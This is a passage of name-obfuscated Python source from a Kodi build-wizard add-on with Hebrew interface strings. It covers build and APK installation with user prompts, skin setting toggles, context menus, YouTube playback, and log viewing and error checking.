			O00OO00000OOOO0O0 =OO00OO00O00000O0O .read ()#line:4268
			OO00OO00O00000O0O .close ()#line:4269
			OOO0000OO00O000O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4270
			OO0O000O0OO0OOO0O =re .compile (OOO0000OO00O000O0 ).findall (O00OO00000OOOO0O0 )[0 ]#line:4271
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'w')#line:4272
			OO00OO00O00000O0O .write (O00OO00000OOOO0O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO0O000O0OO0OOO0O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4273
			OO00OO00O00000O0O .close ()#line:4274
			O0O0OO00OO000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4278
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'r')#line:4280
			O00OO00000OOOO0O0 =OO00OO00O00000O0O .read ()#line:4281
			OO00OO00O00000O0O .close ()#line:4282
			OOO0000OO00O000O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4283
			OO0O000O0OO0OOO0O =re .compile (OOO0000OO00O000O0 ).findall (O00OO00000OOOO0O0 )[0 ]#line:4284
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'w')#line:4285
			OO00OO00O00000O0O .write (O00OO00000OOOO0O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO0O000O0OO0OOO0O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4286
			OO00OO00O00000O0O .close ()#line:4287
		except :#line:4292
			pass #line:4293
def thirdPartyInstall (OO0O00O0OO00OO000 ,O00OO0O00OOOOO0OO ):#line:4295
	if not wiz .workingURL (O00OO0O00OOOOO0OO ):#line:4296
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4297
	OO0O0O0000OOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00O0OO00OO000 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4298
	if OO0O0O0000OOO00OO ==1 :#line:4299
		freshStart ('third',True )#line:4300
	wiz .clearS ('build')#line:4301
	OOO00OO0000000O00 =OO0O00O0OO00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4302
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4303
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00O0OO00OO000 ),'','אנא המתן')#line:4304
	O0O000OO0O0OOOOOO =os .path .join (PACKAGES ,'%s.zip'%OOO00OO0000000O00 )#line:4305
	try :os .remove (O0O000OO0O0OOOOOO )#line:4306
	except :pass #line:4307
	downloader .download (O00OO0O00OOOOO0OO ,O0O000OO0O0OOOOOO ,DP )#line:4308
	xbmc .sleep (1000 )#line:4309
	OO0OOOOOO000O000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00O0OO00OO000 )#line:4310
	DP .update (0 ,OO0OOOOOO000O000O ,'','אנא המתן')#line:4311
	O0OO000O000O000OO ,OO00O00000OO0O0OO ,O0OO000OOO0OO0000 =extract .all (O0O000OO0O0OOOOOO ,HOME ,DP ,title =OO0OOOOOO000O000O )#line:4312
	if int (float (O0OO000O000O000OO ))>0 :#line:4313
		wiz .fixmetas ()#line:4314
		wiz .lookandFeelData ('save')#line:4315
		wiz .defaultSkin ()#line:4316
		wiz .setS ('installed','true')#line:4318
		wiz .setS ('extract',str (O0OO000O000O000OO ))#line:4319
		wiz .setS ('errors',str (OO00O00000OO0O0OO ))#line:4320
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO000O000O000OO ,OO00O00000OO0O0OO ))#line:4321
		try :os .remove (O0O000OO0O0OOOOOO )#line:4322
		except :pass #line:4323
		if int (float (OO00O00000OO0O0OO ))>0 :#line:4324
			O0OOO0000000O0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00O0OO00OO000 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OO000O000O000OO ,'%',COLOR1 ,OO00O00000OO0O0OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4325
			if O0OOO0000000O0O0O :#line:4326
				if isinstance (OO00O00000OO0O0OO ,unicode ):#line:4327
					O0OO000OOO0OO0000 =O0OO000OOO0OO0000 .encode ('utf-8')#line:4328
				wiz .TextBox (ADDONTITLE ,O0OO000OOO0OO0000 )#line:4329
	DP .close ()#line:4330
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4331
	if INSTALLMETHOD ==1 :O00OO00O0OOO0OO00 =1 #line:4332
	elif INSTALLMETHOD ==2 :O00OO00O0OOO0OO00 =0 #line:4333
	else :O00OO00O0OOO0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4334
	if O00OO00O0OOO0OO00 ==1 :wiz .reloadFix ()#line:4335
	else :wiz .killxbmc (True )#line:4336
def testTheme (OOOOOO0O0000O00OO ):#line:4338
	O0O00O00OO0000000 =zipfile .ZipFile (OOOOOO0O0000O00OO )#line:4339
	for OOOO0O0000O0O0O00 in O0O00O00OO0000000 .infolist ():#line:4340
		if '/settings.xml'in OOOO0O0000O0O0O00 .filename :#line:4341
			return True #line:4342
	return False #line:4343
def testGui (OO0OOO0OOO0O00OOO ):#line:4345
	OO00000OO00O0OO00 =zipfile .ZipFile (OO0OOO0OOO0O00OOO )#line:4346
	for O00OOOOO0OO0O0O0O in OO00000OO00O0OO00 .infolist ():#line:4347
		if '/guisettings.xml'in O00OOOOO0OO0O0O0O .filename :#line:4348
			return True #line:4349
	return False #line:4350
def apkInstaller (OOO00OO0OOOO0O0O0 ,O0000OO00O00O0000 ):#line:4352
	wiz .log (OOO00OO0OOOO0O0O0 )#line:4353
	wiz .log (O0000OO00O00O0000 )#line:4354
	if wiz .platform ()=='android':#line:4355
		OO00000O00000OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00OO0OOOO0O0O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4356
		if not OO00000O00000OOO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4357
		O0O0O0O0OO0O0000O =OOO00OO0OOOO0O0O0 #line:4358
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4359
		if not wiz .workingURL (O0000OO00O00O0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4360
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0O0OO0O0000O ),'','אנא המתן')#line:4361
		OOOOO0OOO00OOOO00 =os .path .join (PACKAGES ,"%s.apk"%OOO00OO0OOOO0O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4362
		try :os .remove (OOOOO0OOO00OOOO00 )#line:4363
		except :pass #line:4364
		downloader .download (O0000OO00O00O0000 ,OOOOO0OOO00OOOO00 ,DP )#line:4365
		xbmc .sleep (100 )#line:4366
		DP .close ()#line:4367
		notify .apkInstaller (OOO00OO0OOOO0O0O0 )#line:4368
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOOOO0OOO00OOOO00 +'")')#line:4369
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4370
def createMenu (O0O0000OOO00O00O0 ,OOOOOOO0O0OO0OO0O ,O0O00OO00O0O0OOO0 ):#line:4376
	if O0O0000OOO00O00O0 =='saveaddon':#line:4377
		OOOOO000OO0000O0O =[]#line:4378
		OO0O0OO0O0000OO00 =urllib .quote_plus (OOOOOOO0O0OO0OO0O .lower ().replace (' ',''))#line:4379
		OO0OOO0O000O0O000 =OOOOOOO0O0OO0OO0O .replace ('Debrid','Real Debrid')#line:4380
		OOOO00OO0O0O0000O =urllib .quote_plus (O0O00OO00O0O0OOO0 .lower ().replace (' ',''))#line:4381
		O0O00OO00O0O0OOO0 =O0O00OO00O0O0OOO0 .replace ('url','URL Resolver')#line:4382
		OOOOO000OO0000O0O .append ((THEME2 %O0O00OO00O0O0OOO0 .title (),' '))#line:4383
		OOOOO000OO0000O0O .append ((THEME3 %'Save %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4384
		OOOOO000OO0000O0O .append ((THEME3 %'Restore %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4385
		OOOOO000OO0000O0O .append ((THEME3 %'Clear %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4386
	elif O0O0000OOO00O00O0 =='save':#line:4387
		OOOOO000OO0000O0O =[]#line:4388
		OO0O0OO0O0000OO00 =urllib .quote_plus (OOOOOOO0O0OO0OO0O .lower ().replace (' ',''))#line:4389
		OO0OOO0O000O0O000 =OOOOOOO0O0OO0OO0O .replace ('Debrid','Real Debrid')#line:4390
		OOOO00OO0O0O0000O =urllib .quote_plus (O0O00OO00O0O0OOO0 .lower ().replace (' ',''))#line:4391
		O0O00OO00O0O0OOO0 =O0O00OO00O0O0OOO0 .replace ('url','URL Resolver')#line:4392
		OOOOO000OO0000O0O .append ((THEME2 %O0O00OO00O0O0OOO0 .title (),' '))#line:4393
		OOOOO000OO0000O0O .append ((THEME3 %'Register %s'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4394
		OOOOO000OO0000O0O .append ((THEME3 %'Save %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4395
		OOOOO000OO0000O0O .append ((THEME3 %'Restore %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4396
		OOOOO000OO0000O0O .append ((THEME3 %'Import %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4397
		OOOOO000OO0000O0O .append ((THEME3 %'Clear Addon %s Data'%OO0OOO0O000O0O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0O0OO0O0000OO00 ,OOOO00OO0O0O0000O )))#line:4398
	elif O0O0000OOO00O00O0 =='install':#line:4399
		OOOOO000OO0000O0O =[]#line:4400
		OOOO00OO0O0O0000O =urllib .quote_plus (O0O00OO00O0O0OOO0 )#line:4401
		OOOOO000OO0000O0O .append ((THEME2 %O0O00OO00O0O0OOO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOOO00OO0O0O0000O )))#line:4402
		OOOOO000OO0000O0O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOOO00OO0O0O0000O )))#line:4403
		OOOOO000OO0000O0O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOOO00OO0O0O0000O )))#line:4404
		OOOOO000OO0000O0O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOOO00OO0O0O0000O )))#line:4405
		OOOOO000OO0000O0O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOOO00OO0O0O0000O )))#line:4406
	OOOOO000OO0000O0O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4407
	return OOOOO000OO0000O0O #line:4408
def toggleCache (OOO0OOO0OO0OO00O0 ):#line:4410
	OO0O0OO00OO00000O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4411
	OOOO0OO0O00O0OO00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4412
	if OOO0OOO0OO0OO00O0 in ['true','false']:#line:4413
		for O0OOO0O0OOO0O0OO0 in OO0O0OO00OO00000O :#line:4414
			wiz .setS (O0OOO0O0OOO0O0OO0 ,OOO0OOO0OO0OO00O0 )#line:4415
	else :#line:4416
		if not OOO0OOO0OO0OO00O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4417
			try :#line:4418
				O0OOO0O0OOO0O0OO0 =OOOO0OO0O00O0OO00 [OO0O0OO00OO00000O .index (OOO0OOO0OO0OO00O0 )]#line:4419
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0OOO0O0OOO0O0OO0 ))#line:4420
			except :#line:4421
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0OOO0OO0OO00O0 ))#line:4422
		else :#line:4423
			O00OOOO0OOO00OO0O ='true'if wiz .getS (OOO0OOO0OO0OO00O0 )=='false'else 'false'#line:4424
			wiz .setS (OOO0OOO0OO0OO00O0 ,O00OOOO0OOO00OO0O )#line:4425
def playVideo (O000OO00O00O00O00 ):#line:4427
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O000OO00O00O00O00 )#line:4428
	if 'watch?v='in O000OO00O00O00O00 :#line:4429
		OO0OOOOOOO0OOOO0O ,OOOO000O00O0O00OO =O000OO00O00O00O00 .split ('?')#line:4430
		OO00OOOO0OOO0OOO0 =OOOO000O00O0O00OO .split ('&')#line:4431
		for OOO000OOOO00OOOOO in OO00OOOO0OOO0OOO0 :#line:4432
			if OOO000OOOO00OOOOO .startswith ('v='):#line:4433
				O000OO00O00O00O00 =OOO000OOOO00OOOOO [2 :]#line:4434
				break #line:4435
			else :continue #line:4436
	elif 'embed'in O000OO00O00O00O00 or 'youtu.be'in O000OO00O00O00O00 :#line:4437
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O000OO00O00O00O00 )#line:4438
		OO0OOOOOOO0OOOO0O =O000OO00O00O00O00 .split ('/')#line:4439
		if len (OO0OOOOOOO0OOOO0O [-1 ])>5 :#line:4440
			O000OO00O00O00O00 =OO0OOOOOOO0OOOO0O [-1 ]#line:4441
		elif len (OO0OOOOOOO0OOOO0O [-2 ])>5 :#line:4442
			O000OO00O00O00O00 =OO0OOOOOOO0OOOO0O [-2 ]#line:4443
	wiz .log ("YouTube URL: %s"%O000OO00O00O00O00 )#line:4444
	yt .PlayVideo (O000OO00O00O00O00 )#line:4445
def viewLogFile ():#line:4447
	O0OO00OOOO0O00O0O =wiz .Grab_Log (True )#line:4448
	O000OO0OO0OOO0OO0 =wiz .Grab_Log (True ,True )#line:4449
	OOO0O000O00000000 =0 ;OOO0000OO000000O0 =O0OO00OOOO0O00O0O #line:4450
	if not O000OO0OO0OOO0OO0 ==False and not O0OO00OOOO0O00O0O ==False :#line:4451
		OOO0O000O00000000 =DIALOG .select (ADDONTITLE ,["View %s"%O0OO00OOOO0O00O0O .replace (LOG ,""),"View %s"%O000OO0OO0OOO0OO0 .replace (LOG ,"")])#line:4452
		if OOO0O000O00000000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4453
	elif O0OO00OOOO0O00O0O ==False and O000OO0OO0OOO0OO0 ==False :#line:4454
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4455
		return #line:4456
	elif not O0OO00OOOO0O00O0O ==False :OOO0O000O00000000 =0 #line:4457
	elif not O000OO0OO0OOO0OO0 ==False :OOO0O000O00000000 =1 #line:4458
	OOO0000OO000000O0 =O0OO00OOOO0O00O0O if OOO0O000O00000000 ==0 else O000OO0OO0OOO0OO0 #line:4460
	OO0000OOOOOOOOO00 =wiz .Grab_Log (False )if OOO0O000O00000000 ==0 else wiz .Grab_Log (False ,True )#line:4461
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOO0000OO000000O0 ),OO0000OOOOOOOOO00 )#line:4463
def errorChecking (log =None ,count =None ,all =None ):#line:4465
	if log ==None :#line:4466
		OOOOO0OOOOO0O00OO =wiz .Grab_Log (True )#line:4467
		O000OOOO0OO0O0000 =wiz .Grab_Log (True ,True )#line:4468
		if not O000OOOO0OO0O0000 ==False and not OOOOO0OOOOO0O00OO ==False :#line:4469
			O00000O0OO0O0OOOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOOOO0OOOOO0O00OO .replace (LOG ,""),errorChecking (OOOOO0OOOOO0O00OO ,True ,True )),"View %s: %s error(s)"%(O000OOOO0OO0O0000 .replace (LOG ,""),errorChecking (O000OOOO0OO0O0000 ,True ,True ))])#line:4470
			if O00000O0OO0O0OOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4471
		elif OOOOO0OOOOO0O00OO ==False and O000OOOO0OO0O0000 ==False :#line:4472
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4473
			return #line:4474
		elif not OOOOO0OOOOO0O00OO ==False :O00000O0OO0O0OOOO =0 #line:4475
		elif not O000OOOO0OO0O0000 ==False :O00000O0OO0O0OOOO =1 #line:4476
		log =OOOOO0OOOOO0O00OO if O00000O0OO0O0OOOO ==0 else O000OOOO0OO0O0000 #line:4477
	if log ==False :#line:4478
		if count ==None :#line:4479
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4480
			return False #line:4481
		else :#line:4482
			return 0 #line:4483
	else :#line:4484
		if os .path .exists (log ):#line:4485
			O000OOO00OOOOOO00 =open (log ,mode ='r');OOO000O00O0O0OOOO =O000OOO00OOOOOO00 .read ().replace ('\n','').replace ('\r','');O000OOO00OOOOOO00 .close ()#line:4486
			OOO00000000000OOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO000O00O0O0OOOO )#line:4487
			if not count ==None :#line:4488
				if all ==None :#line:4489
					O00O0OO0O000OO000 =0 #line:4490
					for OO0000000O0OOO0O0 in OOO00000000000OOO :#line:4491
						if ADDON_ID in OO0000000O0OOO0O0 :O00O0OO0O000OO000 +=1 #line:4492
					return O00O0OO0O000OO000 #line:4493
				else :return len (OOO00000000000OOO )#line:4494
			if len (OOO00000000000OOO )>0 :#line:4495
				O00O0OO0O000OO000 =0 ;OO0OO00O0O00000OO =""#line:4496
				for OO0000000O0OOO0O0 in OOO00000000000OOO :#line:4497
					if all ==None and not ADDON_ID in OO0000000O0OOO0O0 :continue #line:4498
					else :#line:4499
						O00O0OO0O000OO000 +=1 #line:4500
						OO0OO00O0O00000OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O00O0OO0O000OO000 ,OO0000000O0OOO0O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4501
				if O00O0OO0O000OO000 >0 :#line:4502
					wiz .TextBox (ADDONTITLE ,OO0OO00O0O00000OO )#line:4503
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4504
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4505
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4506
ACTION_PREVIOUS_MENU =10 #line:4508
ACTION_NAV_BACK =92 #line:4509
ACTION_MOVE_LEFT =1 #line:4510
ACTION_MOVE_RIGHT =2 #line:4511
ACTION_MOVE_UP =3 #line:4512
ACTION_MOVE_DOWN =4 #line:4513
ACTION_MOUSE_WHEEL_UP =104 #line:4514
ACTION_MOUSE_WHEEL_DOWN =105 #line:4515
ACTION_MOVE_MOUSE =107 #line:4516
ACTION_SELECT_ITEM =7 #line:4517
ACTION_BACKSPACE =110 #line:4518
ACTION_MOUSE_LEFT_CLICK =100 #line:4519
ACTION_MOUSE_LONG_CLICK =108 #line:4520
def LogViewer (default =None ):#line:4522
	class OO000OO0O0O0OOO00 (xbmcgui .WindowXMLDialog ):#line:4523
		def __init__ (O0OO0O0OOOO0O00O0 ,*O00O0O00O00OOO000 ,**O000O0OOOOO00O0O0 ):#line:4524
			O0OO0O0OOOO0O00O0 .default =O000O0OOOOO00O0O0 ['default']#line:4525
		def onInit (OOO0O0OOO000O0OOO ):#line:4527
			OOO0O0OOO000O0OOO .title =101 #line:4528
			OOO0O0OOO000O0OOO .msg =102 #line:4529
			OOO0O0OOO000O0OOO .scrollbar =103 #line:4530
			OOO0O0OOO000O0OOO .upload =201 #line:4531
			OOO0O0OOO000O0OOO .kodi =202 #line:4532
			OOO0O0OOO000O0OOO .kodiold =203 #line:4533
			OOO0O0OOO000O0OOO .wizard =204 #line:4534
			OOO0O0OOO000O0OOO .okbutton =205 #line:4535
			OO0O0O0000OOO00O0 =open (OOO0O0OOO000O0OOO .default ,'r')#line:4536
			OOO0O0OOO000O0OOO .logmsg =OO0O0O0000OOO00O0 .read ()#line:4537
			OO0O0O0000OOO00O0 .close ()#line:4538
			OOO0O0OOO000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0OOO000O0OOO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4539
			OOO0O0OOO000O0OOO .showdialog ()#line:4540
		def showdialog (OO000000OO0O00OO0 ):#line:4542
			OO000000OO0O00OO0 .getControl (OO000000OO0O00OO0 .title ).setLabel (OO000000OO0O00OO0 .titlemsg )#line:4543
			OO000000OO0O00OO0 .getControl (OO000000OO0O00OO0 .msg ).setText (wiz .highlightText (OO000000OO0O00OO0 .logmsg ))#line:4544
			OO000000OO0O00OO0 .setFocusId (OO000000OO0O00OO0 .scrollbar )#line:4545
		def onClick (OOOOOO000OOOOO0OO ,O0O0O0O000OOOOO00 ):#line:4547
			if O0O0O0O000OOOOO00 ==OOOOOO000OOOOO0OO .okbutton :OOOOOO000OOOOO0OO .close ()#line:4548
			elif O0O0O0O000OOOOO00 ==OOOOOO000OOOOO0OO .upload :OOOOOO000OOOOO0OO .close ();uploadLog .Main ()#line:4549
			elif O0O0O0O000OOOOO00 ==OOOOOO000OOOOO0OO .kodi :#line:4550
				OOOOO0O0OOO00O000 =wiz .Grab_Log (False )#line:4551
				O00O0O0000O0OOO00 =wiz .Grab_Log (True )#line:4552
				if OOOOO0O0OOO00O000 ==False :#line:4553
					OOOOOO000OOOOO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4554
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .msg ).setText ("Log File Does Not Exists!")#line:4555
				else :#line:4556
					OOOOOO000OOOOO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0000O0OOO00 .replace (LOG ,''))#line:4557
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .title ).setLabel (OOOOOO000OOOOO0OO .titlemsg )#line:4558
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .msg ).setText (wiz .highlightText (OOOOO0O0OOO00O000 ))#line:4559
					OOOOOO000OOOOO0OO .setFocusId (OOOOOO000OOOOO0OO .scrollbar )#line:4560
			elif O0O0O0O000OOOOO00 ==OOOOOO000OOOOO0OO .kodiold :#line:4561
				OOOOO0O0OOO00O000 =wiz .Grab_Log (False ,True )#line:4562
				O00O0O0000O0OOO00 =wiz .Grab_Log (True ,True )#line:4563
				if OOOOO0O0OOO00O000 ==False :#line:4564
					OOOOOO000OOOOO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4565
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .msg ).setText ("Log File Does Not Exists!")#line:4566
				else :#line:4567
					OOOOOO000OOOOO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0000O0OOO00 .replace (LOG ,''))#line:4568
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .title ).setLabel (OOOOOO000OOOOO0OO .titlemsg )#line:4569
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .msg ).setText (wiz .highlightText (OOOOO0O0OOO00O000 ))#line:4570
					OOOOOO000OOOOO0OO .setFocusId (OOOOOO000OOOOO0OO .scrollbar )#line:4571
			elif O0O0O0O000OOOOO00 ==OOOOOO000OOOOO0OO .wizard :#line:4572
				OOOOO0O0OOO00O000 =wiz .Grab_Log (False ,False ,True )#line:4573
				O00O0O0000O0OOO00 =wiz .Grab_Log (True ,False ,True )#line:4574
				if OOOOO0O0OOO00O000 ==False :#line:4575
					OOOOOO000OOOOO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4576
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .msg ).setText ("Log File Does Not Exists!")#line:4577
				else :#line:4578
					OOOOOO000OOOOO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0000O0OOO00 .replace (ADDONDATA ,''))#line:4579
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .title ).setLabel (OOOOOO000OOOOO0OO .titlemsg )#line:4580
					OOOOOO000OOOOO0OO .getControl (OOOOOO000OOOOO0OO .msg ).setText (wiz .highlightText (OOOOO0O0OOO00O000 ))#line:4581
					OOOOOO000OOOOO0OO .setFocusId (OOOOOO000OOOOO0OO .scrollbar )#line:4582
		def onAction (OOOO00000O00000OO ,O0OO0OOO00OO00O00 ):#line:4584
			if O0OO0OOO00OO00O00 ==ACTION_PREVIOUS_MENU :OOOO00000O00000OO .close ()#line:4585
			elif O0OO0OOO00OO00O00 ==ACTION_NAV_BACK :OOOO00000O00000OO .close ()#line:4586
	if default ==None :default =wiz .Grab_Log (True )#line:4587
	O0OOO0O0OOOO00OOO =OO000OO0O0O0OOO00 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4588
	O0OOO0O0OOOO00OOO .doModal ()#line:4589
	del O0OOO0O0OOOO00OOO #line:4590
def removeAddon (O0OOO0OO0O0O0O0OO ,OOOOO0O0000OO0O0O ,over =False ):#line:4592
	if not over ==False :#line:4593
		O000O0OO0O00OOO00 =1 #line:4594
	else :#line:4595
		O000O0OO0O00OOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO0O0000OO0O0O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0OOO0OO0O0O0O0OO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4596
	if O000O0OO0O00OOO00 ==1 :#line:4597
